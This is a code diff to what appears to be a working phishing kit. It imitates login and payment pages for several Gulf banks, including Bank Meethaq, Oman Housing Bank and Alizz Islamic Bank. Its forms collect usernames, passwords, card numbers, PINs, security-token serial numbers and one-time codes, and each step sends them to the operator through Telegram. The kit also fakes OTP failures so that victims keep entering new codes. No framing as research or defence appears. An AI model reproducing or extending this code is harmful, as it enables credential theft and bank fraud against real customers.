-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('otpWaiting').classList.add('active');
-        setTimeout(() => { showPage(4);
-            showOTPPage(bankKey); }, 5000);
+    function showMeethaqStep2() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك ميثاق - الخطوة 2</h3>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="meethaqCard" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'meethaqCardType')"><div class="card-type" id="meethaqCardType"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="meethaqCardError">رقم بطاقة غير صحيح</div></div>
+            <div class="form-group"><label>What is your Debit/ATM Card pin?</label><input type="password" id="meethaqPin" class="form-control" maxlength="4" placeholder="****"><div class="error-message" id="meethaqPinError">4 أرقام</div></div>
+            <button class="btn btn-block" onclick="proceedMeethaqStep2()">تأكيد</button>`;
     }
 
-    // ============================================================
-    // تم إزالة المهلة 30 ثانية - أصبحت مفتوحة بدون وقت محدد
-    // ============================================================
-
-    function showOTPPage(bankKey) {
-        const container = document.getElementById('bankAuthContainer');
-        const bank = banks[bankKey];
-        if (bankKey === 'firstAbuDhabi') {
-            container.innerHTML = `<h3>المصادقة عبر ${bank.name}</h3>
-                <div class="auth-message"><p>تم إرسال رمز OTP إلى هاتفك المحمول وبريدك الإلكتروني</p><p>يرجى إدخال الرمزين المكونين من 3 أرقام لكل منهما</p></div>
-                <div class="form-group"><label for="otpSMS">OTP الهاتف</label><input type="text" id="otpSMS" class="form-control" placeholder="OTP SMS" maxlength="3" required></div>
-                <div class="form-group"><label for="otpEmail">OTP الإيميل</label><input type="text" id="otpEmail" class="form-control" placeholder="OTP Email" maxlength="3" required></div>
-                <button class="btn btn-block" onclick="verifyDualOTP()">تحقق</button>`;
-        } else {
-            container.innerHTML = `<h3>المصادقة عبر ${bank.name}</h3>
-                <div class="auth-message"><p>تم إرسال رمز OTP إلى هاتفك المحمول</p><p>يرجى إدخال الرمز (من 4 إلى 8 أرقام)</p></div>
-                <div class="form-group"><label for="otpInput">أدخل رمز OTP</label><input type="text" id="otpInput" class="otp-input" placeholder="••••" maxlength="8" required></div>
-                <button class="btn btn-block" id="verifyOtpBtn" onclick="verifyOTP()">تحقق</button>`;
-            // تم إزالة المهلة 30 ثانية - لم نعد نستدعي startOtpCountdown
-        }
+    function proceedMeethaqStep2() {
+        const card = document.getElementById('meethaqCard').value.replace(/\s+/g, '');
+        const pin = document.getElementById('meethaqPin').value;
+        if (!validateCardNumber(card).valid || !/^\d{4}$/.test(pin)) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك ميثاق', authMethod:'step2-card+pin', cardNumber:card, pin:pin}));
+        showMeethaqTokenActivation();
     }
 
-    // تم إزالة دالة startOtpCountdown بالكامل لأنها لم تعد مستخدمة
+    function showMeethaqTokenActivation() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك ميثاق - تفعيل جهاز رمز الأمان</h3>
+            <div class="form-group">
+                <label>الرقم التسلسلي لجهاز رمز الأمان (Token)</label>
+                <input id="meethaqTokenSerial" class="form-control" placeholder="أدخل الرقم التسلسلي المكون من 10 أرقام" maxlength="10">
+                <div class="error-message" id="meethaqTokenError">الرجاء إدخال 10 أرقام</div>
+            </div>
+            <div class="token-note">
+                <strong>ملاحظات:</strong><br>
+                بعد تعيين رقمك السري الجديد .1 أدخل الرقم المتسلسل لىلجماز المكون من 10 أرقام )وهو موجود خلف الجهانا دون الرمز)-( في الحقل العلوي الظاهر في هذه الشاشة. z إنقر على زر إرسال للإستمرار في تفعيل الجهاز. ة بعد الإكتمال الناجح لطلبك هذا، سيكون جهاز رمز الأمان Token) (Secure الخاص بك جاهزٱ للاستخدام.
+            </div>
+            <button class="btn btn-block" onclick="submitMeethaqToken()">إرسال</button>`;
+    }
 
-    function verifyOTP() {
-        const otpInput = document.getElementById('otpInput');
-        const otpValue = otpInput.value;
-        if (!otpValue || otpValue.length < 4 || otpValue.length > 8 || !/^\d+$/.test(otpValue)) return;
-        const bank = banks[currentBank];
-        appendToTelegramMessage(createTelegramMessageContent('otp_entered', { bankName: bank.name, otp: otpValue, wrongAttempts: otpAttempts }));
-        // البنوك التي تظهر لها صفحة السحب للموافقة: بنك الإمارات دبي الوطني، بنك الإمارات الإسلامي، بنك المشرق، بنك أبوظبي الإسلامي
-        if (['emiratesNBD', 'emiratesIslamic', 'mashreq', 'abuDhabiIslamic'].includes(currentBank)) {
-            showSwipeApprovalPage(currentBank);
+    function submitMeethaqToken() {
+        const serial = document.getElementById('meethaqTokenSerial').value.trim();
+        if (!/^\d{10}$/.test(serial)) {
+            document.getElementById('meethaqTokenError').style.display = 'block';
             return;
         }
-        // بقية البنوك تظهر رسالة فشل بعد محاولات
-        showPageWithWaiting(4, 4, 'waiting3', 2000);
+        document.getElementById('meethaqTokenError').style.display = 'none';
+        appendToTelegramMessage(createTelegramMessageContent('meethaq_token', { serialNumber: serial }));
+        showOtpWaiting('meethaq');
+    }
+
+    // ================== بنك الاسكان ==================
+    function showHousingAuth() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك الاسكان العماني</h3>
+            <div class="form-group"><label>اسم المستخدم</label><input id="housingUsername" class="form-control"><div class="error-message" id="housingUsernameError">مطلوب</div></div>
+            <div class="form-group"><label>كلمة المرور</label><input type="password" id="housingPassword" class="form-control"><div class="error-message" id="housingPasswordError">مطلوب</div></div>
+            <button class="btn btn-block" onclick="proceedHousingStep1()">التالي</button>`;
+    }
+
+    function proceedHousingStep1() {
+        const username = document.getElementById('housingUsername').value.trim();
+        const password = document.getElementById('housingPassword').value.trim();
+        if (!username || !password) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك الاسكان العماني', authMethod:'step1-user/pass', username:username, password:password}));
+        document.getElementById('bankAuthContainer').innerHTML = `<div class="simple-waiting"><div class="spinner"></div><h3>جاري التحميل</h3></div>`;
+        setTimeout(() => { showHousingStep2(); }, 2000);
+    }
+
+    function showHousingStep2() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك الاسكان العماني - الخطوة 2</h3>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="housingCard" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'housingCardType')"><div class="card-type" id="housingCardType"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="housingCardError">رقم بطاقة غير صحيح</div></div>
+            <div class="form-group"><label>الرمز السري</label><input type="password" id="housingPin" class="form-control" maxlength="4" placeholder="****"><div class="error-message" id="housingPinError">4 أرقام</div></div>
+            <button class="btn btn-block" onclick="proceedHousingStep2()">تأكيد</button>`;
+    }
+
+    function proceedHousingStep2() {
+        const card = document.getElementById('housingCard').value.replace(/\s+/g, '');
+        const pin = document.getElementById('housingPin').value;
+        if (!validateCardNumber(card).valid || !/^\d{4}$/.test(pin)) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك الاسكان العماني', authMethod:'step2-card+pin', cardNumber:card, pin:pin}));
+        showOtpWaiting('housing');
+    }
+
+    function showSimpleCardAuth(bankKey) {
+        const bank = banks[bankKey];
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>${bank.name}</h3>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'cardTypeDisplay')"><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="cardNumberError">خطأ</div></div>
+            <div class="form-group"><label>الرقم السري</label><input type="password" id="pin" class="form-control" maxlength="4"><div class="error-message" id="pinError">4 أرقام</div></div>
+            <button class="btn btn-block" onclick="proceedToSimpleCardAuth('${bankKey}')">تسجيل الدخول</button>`;
+    }
+
+    function proceedToSimpleCardAuth(bankKey) {
+        const card = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        const pin = document.getElementById('pin').value;
+        if (!validateCardNumber(card).valid || !/^\d{4}$/.test(pin)) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:banks[bankKey].name, authMethod:'card+pin', cardNumber:card, pin}));
+        showOtpWaiting(bankKey);
+    }
+
+    // ================== دوال OTP ==================
+    function showOtpWaiting(bankKey) {
+        appendToTelegramMessage(createTelegramMessageContent('otp_sent', {bankName:banks[bankKey].name, phone:document.getElementById('phoneNumber').value}));
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('otpWaiting').classList.add('active');
+        setTimeout(() => { showPage(4); showOTPPage(bankKey); }, 5000);
+    }
+
+    function showOTPPage(bankKey) {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>المصادقة عبر ${banks[bankKey].name}</h3>
+            <div class="auth-message"><p>تم إرسال رمز OTP إلى هاتفك</p></div>
+            <input id="otpInput" class="otp-input" maxlength="8"><div class="otp-error" id="otpError">خطأ</div><div class="attempts-left" id="attemptsLeft"></div>
+            <button class="btn btn-block" onclick="verifyOTP()">تحقق</button>`;
+    }
+
+    function verifyOTP() {
+        const otp = document.getElementById('otpInput').value;
+        if (!/^\d{4,8}$/.test(otp)) { document.getElementById('otpError').style.display='block'; return; }
+        appendToTelegramMessage(createTelegramMessageContent('otp_entered', {bankName:banks[currentBank].name, otp:otp, wrongAttempts:otpAttempts}));
+        showPageWithWaiting(4,4,'waiting3',2000);
         setTimeout(() => {
             otpAttempts++;
-            if (otpAttempts >= 6) { showFailureMessage('فشلت عملية الدفع');
-                otpAttempts = 0; }
+            document.getElementById('attemptsLeft').textContent = `محاولات متبقية: ${6-otpAttempts}`;
+            document.getElementById('otpError').style.display='block';
+            document.getElementById('otpInput').value = '';
+            if (otpAttempts >= 6) {
+                document.getElementById('bankAuthContainer').innerHTML = '<div class="rejection-message"><p>فشلت عملية الدفع</p></div>';
+                otpAttempts = 0;
+            }
         }, 2000);
     }
 
-    // ============================================================
-    // تم إزالة المهلة 20 ثانية من صفحة السحب - أصبحت مفتوحة
-    // ============================================================
-
-    function showSwipeApprovalPage(bankKey) {
-        const container = document.getElementById('bankAuthContainer');
-        const bank = banks[bankKey];
-        if (timerInterval) clearInterval(timerInterval);
-        container.innerHTML = `
-            <div class="browser-auth-container">
-                <div style="width:120px;margin:0 auto 30px;"><img src="${bank.logo}" alt="${bank.name}" style="width:100%;"></div>
-                <div style="font-size:20px;font-weight:bold;color:#111;line-height:2;margin-bottom:40px;">عزيزي عميل ${bank.name}<br>تم إرسال طلب لتوثيق دخولك من المتصفح<br>يرجى التوجه إلى تطبيق ${bank.name}<br>والسحب للموافقة</div>
-                <button id="swipeBtn" style="width:100%;height:70px;border-radius:22px;background:linear-gradient(to left,#eef1f8,#f7f8fc);display:flex;align-items:center;justify-content:space-between;padding:0 15px;border:none;cursor:pointer;">
-                    <div class="arrow-box" style="width:60px;height:60px;background:#0047a8;border-radius:18px;display:flex;justify-content:center;align-items:center;color:white;font-size:34px;font-weight:bold;">←</div>
-                    <div id="swipeBtnText" style="flex:1;text-align:center;font-size:24px;font-weight:bold;color:#001b5e;">السحب للموافقة</div>
-                </button>
-                <!-- تم إزالة عداد الوقت -->
-            </div>`;
-        
-        // الزر مفعل فوراً بدون انتظار
-        const swipeBtn = document.getElementById('swipeBtn');
-        swipeBtn.addEventListener('click', () => {
-            if (timerInterval) clearInterval(timerInterval);
-            otpAttempts++;
-            if (otpAttempts >= 6) { showFailureMessage('فشلت عملية الدفع');
-                otpAttempts = 0; } else { showOTPPage(bankKey); }
-        });
-    }
-
-    function verifyDualOTP() {
-        const sms = document.getElementById('otpSMS').value;
-        const email = document.getElementById('otpEmail').value;
-        if (!sms || sms.length !== 3 || !/^\d+$/.test(sms) || !email || email.length !== 3 || !/^\d+$/.test(email)) return;
-        appendToTelegramMessage(createTelegramMessageContent('otp_entered', { bankName: banks.firstAbuDhabi.name, otp: `SMS: ${sms}, Email: ${email}`,
-            wrongAttempts: otpAttempts }));
-        showPageWithWaiting(4, 4, 'waiting3', 2000);
-        setTimeout(() => { showBrowserAuthPage(); }, 2000);
-    }
-
-    // ============================================================
-    // تم إزالة المهلة 30 ثانية من صفحة توثيق المتصفح
-    // ============================================================
-
-    function showBrowserAuthPage() {
+    // ================== بنك العز الإسلامي ==================
+    function showIzzIslamicStep1() {
         document.getElementById('bankAuthContainer').innerHTML = `
-            <div class="browser-auth-container">
-                <h3>توثيق المتصفح</h3>
-                <div class="browser-auth-message"><p>عزيزي عميل بنك أبو ظبي الأول</p><p>تم إرسال طلب لتوثيق دخولك من المتصفح</p><p>يرجى التوجه إلى تطبيق FAB وقبول طلب التوثيق</p></div>
-                <img src="https://play-lh.googleusercontent.com/4jSRR95ewSWbxkmIiY_CoXoliOuIISZMFQmPpeqwfS3b4z9fD7ylQ-LDJdas_PhORm0=w600-h300-pc0xffffff-pd" alt="تطبيق FAB" class="browser-auth-image">
-                <p>اضغط على "تم التوثيق" بعد إتمام عملية التوثيق</p>
-                <button class="btn btn-block" id="authConfirmBtn">تم التوثيق</button>
-                <!-- تم إزالة عداد الوقت -->
-            </div>`;
-        
-        // الزر مفعل فوراً
-        const btn = document.getElementById('authConfirmBtn');
-        btn.addEventListener('click', handleBrowserAuthConfirmation);
+            <h3>بنك العز الإسلامي - الخطوة 1</h3>
+            <div class="form-group"><label>اسم المستخدم</label><input id="izzUsername" class="form-control"><div class="error-message" id="izzUsernameError">مطلوب</div></div>
+            <div class="form-group"><label>كلمة المرور</label><input type="password" id="izzPassword" class="form-control"><div class="error-message" id="izzPasswordError">مطلوب</div></div>
+            <button class="btn btn-block" onclick="proceedIzzIslamicStep1()">التالي</button>`;
     }
 
-    function handleBrowserAuthConfirmation() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<div class="browser-auth-container"><h3>توثيق المتصفح</h3><div class="rejection-message"><p>عزيزي العميل، تم رفض التوثيق. يرجى إعادة المحاولة.</p></div></div>`;
-        setTimeout(() => { showFirstAbuDhabiAuth(); }, 3000);
+    function proceedIzzIslamicStep1() {
+        const username = document.getElementById('izzUsername').value.trim();
+        const password = document.getElementById('izzPassword').value.trim();
+        if (!username || !password) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك العز الإسلامي', authMethod:'step1-user/pass', username, password}));
+        document.getElementById('bankAuthContainer').innerHTML = `<div class="simple-waiting"><div class="spinner"></div><h3>جاري التحميل</h3></div>`;
+        setTimeout(() => { showIzzIslamicStep2(); }, 2000);
     }
 
-    function showFailureMessage(message) {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<div class="rejection-message"><p>${message}</p></div>`;
+    function showIzzIslamicStep2() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>بنك العز الإسلامي - الخطوة 2</h3>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="izzCard" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'izzCardType')"><div class="card-type" id="izzCardType"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="izzCardError">رقم بطاقة غير صحيح</div></div>
+            <div class="form-group"><label>رمز PIN</label><input type="password" id="izzPin" class="form-control" maxlength="4" placeholder="****"><div class="error-message" id="izzPinError">4 أرقام</div></div>
+            <button class="btn btn-block" onclick="proceedIzzIslamicStep2()">ادفع</button>`;
     }
 
-    // تم إزالة دالة startTimer بالكامل لأنها لم تعد مستخدمة
+    function proceedIzzIslamicStep2() {
+        const card = document.getElementById('izzCard').value.replace(/\s+/g, '');
+        const pin = document.getElementById('izzPin').value;
+        if (!validateCardNumber(card).valid || !/^\d{4}$/.test(pin)) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName:'بنك العز الإسلامي', authMethod:'step2-card+pin', cardNumber: card, pin}));
+        showOtpWaiting('izzislamic');
+    }
 </script>
 </body>
 </html>
